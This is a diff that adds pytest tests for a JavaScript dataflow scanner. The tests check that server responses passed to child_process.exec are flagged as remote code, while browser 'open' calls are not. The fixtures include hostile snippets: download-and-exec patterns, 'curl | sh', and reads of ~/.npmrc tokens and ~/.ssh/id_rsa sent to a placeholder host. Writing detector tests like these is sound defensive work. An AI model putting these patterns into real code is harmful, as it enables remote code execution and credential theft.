@@ -283,6 +283,212 @@ class TestIdentityAsDestination:
         assert [f for f in flows if "identity" in f[0]]
 
 
+class TestWhereAResponseGoes:
+    """What a server sent reaches a child process only through what it was stored in. Each
+    benign shape below let one response reach every command a file runs (review 98 P1 A/B: the
+    D1 dataflow's REMOTE_CODE blocks on benign tools); each positive still reaches it."""
+
+    HEAD = 'const cp = require("child_process"); const fs = require("fs");\n'
+    GET = 'fetch("https://h.invalid/x").then(r => r.text())'
+    APART: ClassVar[dict[str, str]] = {
+        # TypeScript's annotations hid every function, so a file was one scope.
+        "typed functions": (
+            f"async function load(): Promise<string> {{ const pid = await {GET}; return pid; }}\n"
+            "function parent(): string {\n"
+            '  let pid = process.ppid; return cp.spawnSync("ps", ["-p", String(pid)]).stdout;\n'
+            "}\n"
+        ),
+        "typed arrows": (
+            f"const load = async (u: string): Promise<string> => {{ const out = await {GET}; return out; }};\n"
+            'const ps = (p: number): void => { const out = String(p); cp.spawnSync("ps", ["-p", out]); };\n'
+        ),
+        # A runtime object stored into is not the file's own value.
+        "process stored into": (
+            f"async function check() {{ const ok = await {GET}; process.exitCode = ok ? 0 : 1; }}\n"
+            'cp.spawnSync("ps", ["-p", String(process.ppid)]);\n'
+        ),
+        "a log opened to write": (
+            f"async function f() {{ const body = await {GET};\n"
+            '  const log = fs.openSync("x.log", "a"); fs.writeSync(log, body);\n'
+            '  cp.spawn(process.execPath, ["cli.js"], { stdio: ["ignore", log, log] }); }\n'
+        ),
+        # Each class's `this` is its own instance.
+        "two classes": (
+            f"class A {{ async load() {{ this.data = await {GET}; }} }}\n"
+            'class B { constructor() { this.data = "ls"; } run() { cp.exec(this.data); } }\n'
+        ),
+        "two classes, one method name": (
+            f"class A {{ get() {{ return {GET}; }} use() {{ return this.get(); }} }}\n"
+            'class B { get() { return "ls"; } run() { cp.exec(this.get()); } }\n'
+        ),
+    }
+    REACHES: ClassVar[dict[str, str]] = {
+        "two thens": f"{GET}.then(t => cp.exec(t));\n",
+        "a typed function": (
+            f"async function run(): Promise<void> {{ const t: string = await {GET}; cp.exec(t); }}\n"
+        ),
+        "one class's field": (
+            f"class A {{ async load() {{ this.code = await {GET}; }} run() {{ cp.exec(this.code); }} }}\n"
+        ),
+        "an arrow in a method": (
+            f"class A {{ load() {{ {GET}.then(t => {{ this.code = t; }}); }} run() {{ cp.exec(this.code); }} }}\n"
+        ),
+        "a typed class": (
+            "class A {\n  private code: string = '';\n"
+            f"  async load(): Promise<void> {{ this.code = await {GET}; }}\n"
+            "  run(): void { cp.exec(this.code); }\n}\n"
+        ),
+        "prototype methods": (
+            f"function C() {{}}\nC.prototype.load = function () {{ this.s = {GET}; }};\n"
+            "C.prototype.run = function () { cp.exec(this.s); };\n"
+        ),
+        "a body joined from chunks": (
+            'require("https").get("https://h.invalid/x", res => { const c = [];\n'
+            '  res.on("data", d => c.push(d));\n'
+            '  res.on("end", () => cp.exec(Buffer.concat(c).toString())); });\n'
+        ),
+        "a file opened to read": (
+            'async function f() { const fd = fs.openSync("x", "r"); '
+            f"const t = await {GET}; cp.exec(t); }}\n"
+        ),
+        # What a promise's executor resolves it with is the promise's value: a download
+        # written the usual way, which the shared `Buffer` used to carry by accident.
+        "a promise resolved with it": (
+            "function download(u) { return new Promise((resolve, reject) => {\n"
+            '  require("https").get(u, res => { const c = [];\n'
+            '    res.on("data", d => c.push(d)); res.on("end", () => resolve(Buffer.concat(c))); });\n'
+            "}); }\n"
+            'async function main() { const body = await download("https://h.invalid/x");\n'
+            "  cp.exec(body.toString()); }\n"
+        ),
+        # `new C(x)` gives C's fields what its constructor took.
+        "a constructor's argument": (
+            "class Runner { constructor(command) { this.command = command; }\n"
+            "  start() { cp.exec(this.command); } }\n"
+            f"async function main() {{ new Runner(await {GET}).start(); }}\n"
+        ),
+        "a bundler's class expression": (
+            "var Runner = class { constructor(command) { this.command = command; }\n"
+            "  start() { cp.exec(this.command); } };\n"
+            f"async function main() {{ new Runner(await {GET}).start(); }}\n"
+        ),
+        "a method's argument": (
+            "class Runner { set(command) { this.command = command; } start() { cp.exec(this.command); } }\n"
+            f"async function main() {{ const r = new Runner(); r.set(await {GET}); r.start(); }}\n"
+        ),
+        # A compiled async method runs its body in a generator `__awaiter` binds to `this`.
+        "a compiled async method": (
+            "class A {\n"
+            f"  load() {{ return __awaiter(this, void 0, void 0, function* () {{ this.code = yield {GET}; }}); }}\n"
+            "  run() { return __awaiter(this, void 0, void 0, function* () { cp.exec(this.code); }); }\n"
+            "}\n"
+        ),
+    }
+
+    def test_a_regular_expressions_exec_runs_nothing(self) -> None:
+        text = (
+            'const { exec } = require("child_process"); const fs = require("fs");\n'
+            'const t = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");\n'
+            "const m = /token=(.*)/.exec(t);\n"
+        )
+        assert FlowKit.flows(text) == []
+        sent = text + 'exec("curl -d " + t);\n'
+        assert (["home_file", "secret_file"], "process", "unknown") in FlowKit.flows(sent)
+
+    @staticmethod
+    def runs(text: str) -> bool:
+        return any(
+            "network_response" in s and k in ("process", "execute")
+            for s, k, _ in FlowKit.flows(text)
+        )
+
+    @pytest.mark.parametrize("name", sorted(APART))
+    def test_a_response_stays_where_it_was_stored(self, name: str) -> None:
+        assert not self.runs(self.HEAD + self.APART[name])
+
+    @pytest.mark.parametrize("name", sorted(REACHES))
+    def test_a_response_run_is_still_found(self, name: str) -> None:
+        assert self.runs(self.HEAD + self.REACHES[name])
+
+    def test_typed_parameters_keep_their_positions(self) -> None:
+        text = (
+            'const os = require("os");\n'
+            "function send(tag: string, body: Record<string, any>): void {\n"
+            '  fetch("https://h.invalid/u", { method: "POST", body: JSON.stringify(body) });\n'
+            "}\n"
+            'send("t", { h: os.hostname() });\n'
+        )
+        assert (["identity"], "request", "fixed") in FlowKit.flows(text)
+
+
+class TestOpeners:
+    """A link the server sent, opened in the desktop's browser (a sign-in page), runs none of
+    it: an `open` sink, which the send rules read and the remote-code rule does not."""
+
+    HEAD = (
+        'const { exec, spawn } = require("child_process");\nasync function go() {\n'
+        'const url = (await (await fetch("https://h.invalid/login")).json()).uri;\n'
+    )
+    OPENS: ClassVar[dict[str, str]] = {
+        "a platform choice": (
+            "const p = process.platform;\n"
+            'exec(p === "darwin" ? `open "${url}"` : p === "win32" ? `start "" "${url}"`'
+            ' : `xdg-open "${url}"`);\n'
+        ),
+        "a command built first": (
+            'const cmd = process.platform === "darwin" ? `open -a "${app}" "${url}"`'
+            ' : `xdg-open "${url}"`;\nexec(cmd, () => {});\n'
+        ),
+        "spawned": 'spawn("xdg-open", [url], { stdio: "ignore" });\n',
+        "rundll32": "exec(`rundll32 url.dll,FileProtocolHandler ${url}`);\n",
+        "through a helper": ('function ob(u) { exec(`open "${u}"`); }\nob(url);\n'),
+    }
+    RUNS: ClassVar[dict[str, str]] = {
+        "open in a terminal": 'exec(`open -a Terminal "${url}"`);\n',
+        "one branch a shell": (
+            'exec(process.platform === "darwin" ? `open "${url}"` : `sh -c "${url}"`);\n'
+        ),
+        "piped to a shell": "exec(`curl -fsSL ${url} | sh`);\n",
+        "run as it is": "exec(url);\n",
+    }
+
+    @pytest.mark.parametrize("name", sorted(OPENS))
+    def test_opening_a_link_is_an_open(self, name: str) -> None:
+        flows = FlowKit.flows(self.HEAD + self.OPENS[name] + "}\n")
+        assert (["network_response"], "open") in [f[:2] for f in flows]
+        assert not [f for f in flows if f[1] == "process"]
+
+    @pytest.mark.parametrize("name", sorted(RUNS))
+    def test_running_it_is_a_process(self, name: str) -> None:
+        flows = FlowKit.flows(self.HEAD + self.RUNS[name] + "}\n")
+        assert (["network_response"], "process") in [f[:2] for f in flows]
+
+    def test_a_secret_in_the_link_is_still_sent(self) -> None:
+        from cordon_scanner.detect.code.capability import CapabilityDetector
+
+        text = (
+            'const { exec } = require("child_process"); const fs = require("fs");\n'
+            'const k = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa");\n'
+            'exec(`open "https://h.invalid/?k=${k}"`);\n'
+        )
+        assert (["home_file", "secret_file"], "open", "unknown") in FlowKit.flows(text)
+        sinks = {rule: s for _, rule, s in CapabilityDetector._JS_FLOW_RULES}
+        assert "open" in sinks["CAP.JS.FLOW.SECRET_FILE_SENT"]
+        assert "open" not in sinks["CAP.JS.FLOW.REMOTE_CODE"]
+
+    def test_the_host_name_in_the_link_is_still_sent(self) -> None:
+        from cordon_scanner.detect.code.capability import CapabilityDetector
+
+        text = (
+            'const { exec } = require("child_process"); const os = require("os");\n'
+            'exec(`open "https://h.invalid/?h=${os.hostname()}"`);\n'
+        )
+        assert (["identity"], "open", "unknown") in FlowKit.flows(text)
+        sinks = {rule: s for _, rule, s in CapabilityDetector._JS_FLOW_RULES}
+        assert "open" in sinks["CAP.JS.FLOW.IDENTITY_SENT"]
+        assert "open" in sinks["CAP.JS.FLOW.ENVIRONMENT_SENT"]
+
+
 class TestBounds:
     def test_a_large_generated_file_finishes(self) -> None:
         text = "".join(f"function f{i}(a) {{ return g{i}(a) + {i}; }}\n" for i in range(20_000))
